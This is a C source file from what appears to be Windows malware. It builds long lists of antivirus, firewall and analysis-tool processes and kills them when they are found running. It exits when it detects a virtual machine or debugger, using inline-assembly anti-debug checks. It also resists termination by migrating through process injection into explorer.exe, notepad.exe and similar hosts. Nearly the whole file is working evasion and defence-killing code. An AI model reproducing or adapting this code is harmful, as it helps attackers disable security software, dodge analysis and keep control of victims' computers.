#include "api.h"
#include "process.h"
#include "misc.h"
#include "inject.h"
#include "security.h"


char *av_process_list[] = {
	"AAWTray.exe","Ad-Aware.exe","MSASCui.exe","_avp32.exe","_avpcc.exe","_avpm.exe","aAvgApi.exe","ackwin32.exe","adaware.exe","advxdwin.exe",
	"agentsvr.exe","agentw.exe","alertsvc.exe","alevir.exe","alogserv.exe","amon9x.exe","anti-trojan.exe","antivirus.exe","ants.exe","apimonitor.exe",
	"aplica32.exe","apvxdwin.exe","arr.exe","atcon.exe","atguard.exe","atro55en.exe","atupdater.exe","atwatch.exe","au.exe","aupdate.exe",
	"auto-protect.nav80try.exe","autodown.exe","autotrace.exe","autoupdate.exe","avconsol.exe","ave32.exe","avgcc32.exe","avgctrl.exe","avgemc.exe","avgnt.exe",
	"avgrsx.exe","avgserv.exe","avgserv9.exe","avguard.exe","avgw.exe","avkpop.exe","avkserv.exe","avkservice.exe","avkwctl9.exe","avltmain.exe",
	"avnt.exe","avp.exe","avp.exe","avp32.exe","avpcc.exe","avpdos32.exe","avpm.exe","avptc32.exe","avpupd.exe","avsched32.exe",
	"avsynmgr.exe","avwin.exe","avwin95.exe","avwinnt.exe","avwupd.exe","avwupd32.exe","avwupsrv.exe","avxmonitor9x.exe","avxmonitornt.exe","avxquar.exe",
	"backweb.exe","bargains.exe","bd_professional.exe","beagle.exe","belt.exe","bidef.exe","bidserver.exe","bipcp.exe","bipcpevalsetup.exe","bisp.exe",
	"blackd.exe","blackice.exe","blink.exe","blss.exe","bootconf.exe","bootwarn.exe","borg2.exe","bpc.exe","brasil.exe","bs120.exe",
	"bundle.exe","bvt.exe","ccapp.exe","ccevtmgr.exe","ccpxysvc.exe","cdp.exe","cfd.exe","cfgwiz.exe","cfiadmin.exe","cfiaudit.exe",
	"cfinet.exe","cfinet32.exe","claw95.exe","claw95cf.exe","clean.exe","cleaner.exe","cleaner3.exe","cleanpc.exe","click.exe","cmd.exe",
	"cmd32.exe","cmesys.exe","cmgrdian.exe","cmon016.exe","connectionmonitor.exe","cpd.exe","cpf9x206.exe","cpfnt206.exe","ctrl.exe","cv.exe",
	"cwnb181.exe","cwntdwmo.exe","datemanager.exe","dcomx.exe","defalert.exe","defscangui.exe","defwatch.exe","deputy.exe","divx.exe","dllcache.exe",
	"dllreg.exe","doors.exe","dpf.exe","dpfsetup.exe","dpps2.exe","drwatson.exe","drweb32.exe","drwebupw.exe","dssagent.exe","dvp95.exe",
	"dvp95_0.exe","ecengine.exe","efpeadm.exe","emsw.exe","ent.exe","esafe.exe","escanhnt.exe","escanv95.exe","espwatch.exe","ethereal.exe",
	"etrustcipe.exe","evpn.exe","exantivirus-cnet.exe","exe.avxw.exe","expert.exe","explore.exe","f-agnt95.exe","f-prot.exe","f-prot95.exe","f-stopw.exe",
	"fameh32.exe","fast.exe","fch32.exe","fih32.exe","findviru.exe","firewall.exe","fnrb32.exe","fp-win.exe","fp-win_trial.exe","fprot.exe",
	"frw.exe","fsaa.exe","fsav.exe","fsav32.exe","fsav530stbyb.exe","fsav530wtbyb.exe","fsav95.exe","fsgk32.exe","fsm32.exe","fsma32.exe",
	"fsmb32.exe","gator.exe","gbmenu.exe","gbpoll.exe","generics.exe","gmt.exe","guard.exe","guarddog.exe","hacktracersetup.exe","hbinst.exe",
	"hbsrv.exe","hotactio.exe","hotpatch.exe","htlog.exe","htpatch.exe","hwpe.exe","hxdl.exe","hxiul.exe","iamapp.exe","iamserv.exe",
	"iamstats.exe","ibmasn.exe","ibmavsp.exe","icload95.exe","icloadnt.exe","icmon.exe","icsupp95.exe","icsuppnt.exe","idle.exe","iedll.exe",
	"iedriver.exe","iexplorer.exe","iface.exe","ifw2000.exe","inetlnfo.exe","infus.exe","infwin.exe","init.exe","intdel.exe","intren.exe",
	"iomon98.exe","istsvc.exe","jammer.exe","jdbgmrg.exe","jedi.exe","kavlite40eng.exe","kavpers40eng.exe","kavpf.exe","kazza.exe","keenvalue.exe",
	"kerio-pf-213-en-win.exe","kerio-wrl-421-en-win.exe","kerio-wrp-421-en-win.exe","kernel32.exe","killprocesssetup161.exe","launcher.exe","ldnetmon.exe","ldpro.exe","ldpromenu.exe","ldscan.exe",
	"lnetinfo.exe","loader.exe","localnet.exe","lockdown.exe","lockdown2000.exe","lookout.exe","lordpe.exe","lsetup.exe","luall.exe","luau.exe",
	"lucomserver.exe","luinit.exe","luspt.exe","mapisvc32.exe","mcagent.exe","mcmnhdlr.exe","mcshield.exe","mctool.exe","mcupdate.exe","mcvsrte.exe",
	"mcvsshld.exe","md.exe","mfin32.exe","mfw2en.exe","mfweng3.02d30.exe","mgavrtcl.exe","mgavrte.exe","mghtml.exe","mgui.exe","minilog.exe",
	"mmod.exe","monitor.exe","moolive.exe","mostat.exe","mpfagent.exe","mpfservice.exe","mpftray.exe","mrflux.exe","msapp.exe","msbb.exe",
	"msblast.exe","mscache.exe","msccn32.exe","mscman.exe","msconfig.exe","msdm.exe","msdos.exe","msiexec16.exe","msinfo32.exe","mslaugh.exe",
	"msmgt.exe","msmsgri32.exe","mssmmc32.exe","mssys.exe","msvxd.exe","mu0311ad.exe","mwatch.exe","n32scanw.exe","nav.exe","navap.navapsvc.exe",
	"navapsvc.exe","navapw32.exe","navdx.exe","navlu32.exe","navnt.exe","navstub.exe","navw32.exe","navwnt.exe","nc2000.exe","ncinst4.exe",
	"ndd32.exe","neomonitor.exe","neowatchlog.exe","netarmor.exe","netd32.exe","netinfo.exe","netmon.exe","netscanpro.exe","netspyhunter-1.2.exe","netstat.exe",
	"netutils.exe","nisserv.exe","nisum.exe","nmain.exe","nod32.exe","normist.exe","norton_internet_secu_3.0_407.exe","notstart.exe","npf40_tw_98_nt_me_2k.exe","npfmessenger.exe",
	"nprotect.exe","npscheck.exe","npssvc.exe","nsched32.exe","nssys32.exe","nstask32.exe","nsupdate.exe","nt.exe","ntrtscan.exe","ntvdm.exe",
	"ntxconfig.exe","nui.exe","nupgrade.exe","nvarch16.exe","nvc95.exe","nvsvc32.exe","nwinst4.exe","nwservice.exe","nwtool16.exe","ollydbg.exe",
	"onsrvr.exe","optimize.exe","ostronet.exe","otfix.exe","outpost.exe","outpostinstall.exe","outpostproinstall.exe","padmin.exe","panixk.exe","patch.exe",
	"pavcl.exe","pavproxy.exe","pavsched.exe","pavw.exe","pccwin98.exe","pcfwallicon.exe","pcip10117_0.exe","pcscan.exe","pdsetup.exe","periscope.exe",
	"persfw.exe","perswf.exe","pf2.exe","pfwadmin.exe","pgmonitr.exe","pingscan.exe","platin.exe","pop3trap.exe","poproxy.exe","popscan.exe",
	"portdetective.exe","portmonitor.exe","powerscan.exe","ppinupdt.exe","pptbc.exe","ppvstop.exe","prizesurfer.exe","prmt.exe","prmvr.exe","procdump.exe",
	"processmonitor.exe","procexplorerv1.0.exe","programauditor.exe","proport.exe","protectx.exe","pspf.exe","purge.exe","qconsole.exe","qserver.exe","rapapp.exe",
	"rav7.exe","rav7win.exe","rav8win32eng.exe","ray.exe","rb32.exe","rcsync.exe","realmon.exe","reged.exe","regedit.exe","regedt32.exe",
	"rescue.exe","rescue32.exe","rrguard.exe","rshell.exe","rtvscan.exe","rtvscn95.exe","rulaunch.exe","run32dll.exe","rundll.exe","rundll16.exe",
	"ruxdll32.exe","safeweb.exe","sahagent.exe","save.exe","savenow.exe","sbserv.exe","sc.exe","scam32.exe","scan32.exe","scan95.exe",
	"scanpm.exe","scrscan.exe","serv95.exe","setup_flowprotector_us.exe","setupvameeval.exe","sfc.exe","sgssfw32.exe","sh.exe","shellspyinstall.exe","shn.exe",
	"showbehind.exe","smc.exe","sms.exe","smss32.exe","soap.exe","sofi.exe","sperm.exe","spf.exe","sphinx.exe","spoler.exe",
	"spoolcv.exe","spoolsv32.exe","spyxx.exe","srexe.exe","srng.exe","ss3edit.exe","ssg_4104.exe","ssgrate.exe","st2.exe","start.exe",
	"stcloader.exe","supftrl.exe","support.exe","supporter5.exe","svc.exe","svchostc.exe","svchosts.exe","svshost.exe","sweep95.exe","sweepnet.sweepsrv.sys.swnetsup.exe",
	"symproxysvc.exe","symtray.exe","sysedit.exe","system.exe","system32.exe","sysupd.exe","taskmg.exe","taskmgr.exe","taskmo.exe","taskmon.exe",
	"taumon.exe","tbscan.exe","tc.exe","tca.exe","tcm.exe","tds-3.exe","tds2-98.exe","tds2-nt.exe","teekids.exe","tfak.exe",
	"tfak5.exe","tgbob.exe","titanin.exe","titaninxp.exe","tracert.exe","trickler.exe","trjscan.exe","trjsetup.exe","trojantrap3.exe","tsadbot.exe",
	"tvmd.exe","tvtmd.exe","undoboot.exe","updat.exe","update.exe","upgrad.exe","utpost.exe","vbcmserv.exe","vbcons.exe","vbust.exe",
	"vbwin9x.exe","vbwinntw.exe","vcsetup.exe","vet32.exe","vet95.exe","vettray.exe","vfsetup.exe","vir-help.exe","virusmdpersonalfirewall.exe","vnlan300.exe",
	"vnpc3000.exe","vpc32.exe","vpc42.exe","vpfw30s.exe","vptray.exe","vscan40.exe","vscenu6.02d30.exe","vsched.exe","vsecomr.exe","vshwin32.exe",
	"vsisetup.exe","vsmain.exe","vsmon.exe","vsstat.exe","vswin9xe.exe","vswinntse.exe","vswinperse.exe","w32dsm89.exe","w9x.exe","watchdog.exe",
	"webdav.exe","webscanx.exe","webtrap.exe","wfindv32.exe","whoswatchingme.exe","wimmun32.exe","win-bugsfix.exe","win32.exe","win32us.exe","winactive.exe",
	"window.exe","windows.exe","wininetd.exe","wininitx.exe","winlogin.exe","winmain.exe","winnet.exe","winppr32.exe","winrecon.exe","winservn.exe",
	"winssk32.exe","winstart.exe","winstart001.exe","wintsk32.exe","winupdate.exe","wkufind.exe","wnad.exe","wnt.exe","wradmin.exe","wrctrl.exe",
	"wsbgate.exe","wupdater.exe","wupdt.exe","wyvernworksfirewall.exe","xpf202en.exe","zapro.exe","zapsetup3001.exe","zatutor.exe","zonalm2601.exe","zonealarm.exe",
	"shstat.exe", "engineserver.exe", "frameworkservice.exe", "naprdmgr.exe", "mctray.exe", "mfeann.exe", "vstskmgr.exe"
};


char *av_service_list[] = {   
	"symantec", "mcshield", "windefend", "msmpsvc", "msmpeng", "savservice", "aveservice", "avast!", "immunetprotect", "fsma", "antivirservice", "avguard", "fpavserver",
	"pshost", "pavsrv", "bdss", "abmainsv", "ikarus-guardx", "ekrn", "avkproxy", "klblmain", "vbservprof", "clamav", "SBAMSvc", "navapsvc", "AVP", "manaox2",
	"_Avp32.exe","_Avpcc.exe","_Avpm.exe","Ackwin32.exe","Agnitum Outpost Firewall","Anti-Trojan.exe","ANTIVIR","Apvxdwin.exe","ATRACK","Autodown.exe",
	"AVCONSOL","Avconsol.exe","Ave32.exe","Avgctrl.exe","Avkserv.exe","Avnt.exe","Avp.exe","AVP.EXE","AVP32","Avp32.exe",
	"Avpcc.exe","Avpdos32.exe","Avpm.exe","Avptc32.exe","Avpupd.exe","Avsched32.exe","AVSync Manager","AVSYNMGR","Avwin95.exe","Avwupd32.exe",
	"Blackd.exe","BLACKICE","BlackICE Defender","Blackice.exe","CA Sessionwall-3","Cfiadmin.exe","Cfiaudit.exe","CFINET","Cfinet.exe","CFINET32",
	"Cfinet32.exe","Claw95.exe","Claw95cf.exe","Cleaner.exe","Cleaner3.exe","Defwatch","Defwatch.exe","Dvp95.exe","Dvp95_0.exe","Ecengine.exe",
	"eSafe Protect Desktop","Esafe.exe","Espwatch.exe","eTrust EZ Firewall","F-Agnt95.exe","Findviru.exe","Fprot.exe","F-Prot.exe","F-PROT95","F-Prot95.exe",
	"FP-WIN","Fp-Win.exe","Freedom 2","Frw.exe","F-STOPW","F-Stopw.exe","GNAT Box Lite","IAMAPP","Iamapp.exe","Iamserv.exe",
	"Ibmasn.exe","Ibmavsp.exe","Icload95.exe","Icloadnt.exe","ICMON","Icmon.exe","Icsupp95.exe","Icsuppnt.exe","Iface.exe","Internet Alert 99",
	"IOMON98","Iomon98.exe","Jedi.exe","LOCKDOWN2000","Lockdown2000.exe","Look'n'Stop","Look'n'Stop Lite","Lookout.exe","LUALL","Luall.exe",
	"LUCOMSERVER","MCAFEE","McAfee Firewall","McAfee Internet Guard Dog Pro","Moolive.exe","Mpftray.exe","N32scanw.exe","NAVAPSVC","NAVAPW32","Navapw32.exe",
	"NAVLU32","Navlu32.exe","Navnt.exe","NAVRUNR","NAVW32","Navw32.exe","NAVWNT","Navwnt.exe","NeoWatch","NISSERV",
	"NISUM","Nisum.exe","NMAIN","Nmain.exe","Norman Personal Firewall","Normist.exe","NORTON","Norton AntiVirus Server","Norton Internet Security","Norton Personal Firewall 2001",
	"Nupgrade.exe","NVC95","Nvc95.exe","Outpost.exe","Padmin.exe","Pavcl.exe","Pavsched.exe","Pavw.exe","Pc firewall","PC Viper",
	"PCCIOMON","PCCMAIN","PCCWIN98","Pccwin98.exe","Pcfwallicon.exe","Persfw.exe","PGP Gauntlet","POP3TRAP","Proxy +","PVIEW95",
	"Rav7.exe","Rav7win.exe","Rescue.exe","RESCUE32","SAFEWEB","Safeweb.exe","Scan32.exe","Scan95.exe","Scanpm.exe","Scrscan.exe",
	"Serv95.exe","Smc.exe","SMCSERVICE","Snort - Win32 GUI","Snort (Intrusion Detection System)","Sphinx.exe","Sphinxwall","Sweep95.exe","Sybergen Secure Desktop",
	"Sybergen SyGate","SYMPROXYSVC","Tbscan.exe","Tca.exe","Tds2-98.exe","Tds2-Nt.exe","TermiNET","TGB:BOB","Tiny Personal Firewall","Vet95.exe","Vettray.exe",
	"Vscan40.exe","Vsecomr.exe","VSHWIN32","Vshwin32.exe","VSSTAT","Vsstat.exe","WEBSCANX","Webscanx.exe","WEBTRAP","Wfindv32.exe",
	"Wingate","WinProxy","WinRoute","WyvernWorks Firewall","Zonealarm","Zonealarm.exe","AVP32","LOCKDOWN2000","AVP.EXE","CFINET32",
	"CFINET","ICMON","SAFEWEB","WEBSCANX","ANTIVIR","MCAFEE","NORTON","NVC95","FP-WIN","IOMON98",
	"PCCWIN98","F-PROT95","F-STOPW","PVIEW95","NAVWNT","NAVRUNR","NAVLU32","NAVAPSVC","NISUM","SYMPROXYSVC",
	"RESCUE32","NISSERV","ATRACK","IAMAPP","LUCOMSERVER","LUALL","NMAIN","NAVW32","NAVAPW32","VSSTAT",
	"VSHWIN32","AVSYNMGR","AVCONSOL","WEBTRAP","POP3TRAP","PCCMAIN","PCCIOMON"
};

char *vm_service_list[] = {
	"vmicheartbeat", "vmicvss", "vmicshutdown", "vmicexchange", "vmdebug", "vmmouse", "VMTools", "VMMEMCTL", "vpcbus", "vpc-s3", "vpcuhub", "msvmmouf",
	"xenevtchn", "xennet", "xennet6", "xensvc", "xenvdb", "VBoxMouse", "VBoxGuest", "VBoxService", "VBoxSF"

};

char *vm_process_list[] = {
	"vmwareuser.exe", "vmwaretray.exe", "vmusrvc.exe", "vmsrvc.exe", "vboxservice.exe", "vboxtray.exe", //"VBoxMouse", "VBoxGuest", "VBoxService", "VBoxSF",
	"xenservice.exe", "vmtoolsd.exe",
};


char *auto_inject_process[] = {
	"notepad.exe", "cmd.exe", "taskmgr.exe", "dwm.exe", "explorer.exe"
};


int __security_antidebug() {
	int debug_present;
	void *hide_debug;

	__asm {
		mov eax, dword ptr fs:[0x18]
		mov eax, dword ptr [eax+0x30]
		mov al, byte ptr [eax+0x02]
		cmp al, 0
		je IsNotBeingDebugged1
		push 0x00
		call dword ptr [_ExitProcess]
	IsNotBeingDebugged1:
		nop
	}

	_CheckRemoteDebuggerPresent(_GetCurrentProcess(), &debug_present);

	if(debug_present==0x00) {
		_ExitProcess(0x00);
	}

	hide_debug = _GetProcAddress(_LoadLibraryA("kernel32.dll"), "OpenProcess");
	
	__asm {
		xor ebx, ebx
		mov eax, dword ptr [hide_debug]
		mov bl, byte ptr [eax+0x06]
		cmp bl, 0xEA
		je IsNotBeingDebugged2
		push 0x00
		call dword ptr [_ExitProcess]
	IsNotBeingDebugged2:
		nop
	}

/*
	__asm {
		jmp latency

	IsBeingDebugged3:
		push 0x00
		call dword ptr [_ExitProcess]

	latency:
		RDTSC
		xor ecx, ecx
		add ecx, eax
		RDTSC
		sub eax, ecx
		cmp eax, 0xFFF
		jnb IsBeingDebugged3 
		nop
	}
*/

	_asm {
		mov eax, fs:[0x30]
		add eax, 0x68
		mov eax, dword ptr [eax]
		cmp eax, 0x70
		jne IsNotBeingDebugged4
		push 0x00
		call dword ptr [_ExitProcess]
	IsNotBeingDebugged4:
		nop
	
	}

	return 0;
}

int __security_process(void) {
	proc_struct proc;
	int i = 0, x = 0;
	
	__process_list();

	while(__get_process(&proc, i)==1) {
		x=0;
		for(x=0;x<0x24a;x++) {
			if(_lstrcmpiA(proc.process,av_process_list[x])==0x00) {
				_MessageBoxA(_GetForegroundWindow(), proc.process, "AV Detected", 0x00); //Debug
				__kill_process(proc.procid);
			}
		}

		x=0;
		for(x=0;x<8;x++) {
			if(_lstrcmpiA(vm_process_list[x], proc.process)==0x00) {
				_MessageBoxA(_GetForegroundWindow(), proc.process, "VM Detected", 0x00); //Debig
				_ExitProcess(0x00);
			}
		}
	
		i++;
	}
	
	return 1;
}


int __stdcall __security_monitor(void *params) {
	int i = 0;
	for(;;) {
		__security_process();
		__time_sleep(360);
	}

	return 0;
}

int __security(void) {
	unsigned long thID;
	_CreateThread(0, 0, (PTHREAD_START_ROUTINE *)__security_monitor, 0,0,&thID);

	//__security_unkill();
	__security_antidebug();
	return 1;
}


// NOT KILL ME!!
int __security_unkill(void) {
	unsigned long pinfo = 0x8000F129;

	_ZwSetInformationProcess(_GetCurrentProcess(),0x21,&pinfo,0x4);
	_SetConsoleCtrlHandler(__unkill_control,1);
	return 1;
}

int __stdcall __unkill_control(unsigned long dwCtrlType) {
	int pid  = 0, i = 0, a = 0;
	proc_struct proc;

	//_MessageBoxA(_GetForegroundWindow(), "Do you like kill me?", "cr1m3", 0x00);
	
	__process_list();

	while(__get_process(&proc, i)==1) {
		a = 0;
		for(a=0;a<5;a++) {
			if(_lstrcmpiA(proc.process, auto_inject_process[a])==0x00) {
				pid = proc.id;
			}
		}

		if(pid!=0)
			break;
		else
			i++;
	}

	if(__inject_migration(pid)==0x01)
		_ExitProcess(0x00);

	return 1;
}



